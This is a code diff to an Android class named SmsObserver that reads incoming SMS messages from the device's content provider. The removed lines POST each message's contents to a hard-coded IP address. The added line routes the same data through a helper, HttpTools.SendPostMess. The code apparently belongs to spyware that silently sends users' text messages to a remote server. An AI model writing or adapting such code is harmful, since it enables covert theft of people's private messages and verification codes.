@@ -7,8 +7,6 @@ import android.os.Message;
 import android.util.Log;
 import android.net.Uri;
 
-import java.util.HashMap;
-import java.util.Map;
 
 
 public class SmsObserver extends ContentObserver {
@@ -33,8 +31,7 @@ public class SmsObserver extends ContentObserver {
         }
         else{
             SmsInfo smsinfo = new SmsInfo();
-            Map<String,String> pmap = new HashMap<String, String>();
-            Map<String,String> hmap = new HashMap<String, String>();
+
             if (cursor.moveToFirst()) {
                 int idIndex = cursor.getColumnIndex("_id");
                 if (idIndex != -1) {
@@ -57,13 +54,7 @@ public class SmsObserver extends ContentObserver {
                     smsinfo.read = cursor.getString(readIndex);
                 }
                 Log.i("smswatch", smsinfo.toString());
-                pmap.put("data",smsinfo.toString());
-                hmap.put("smsinfo","1");
-                try {
-                    HttpRequestUtil.sendPost("http://207.246.104.61:81/data", pmap, hmap);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                HttpTools.SendPostMess(smsinfo.toString());
 
             }
 
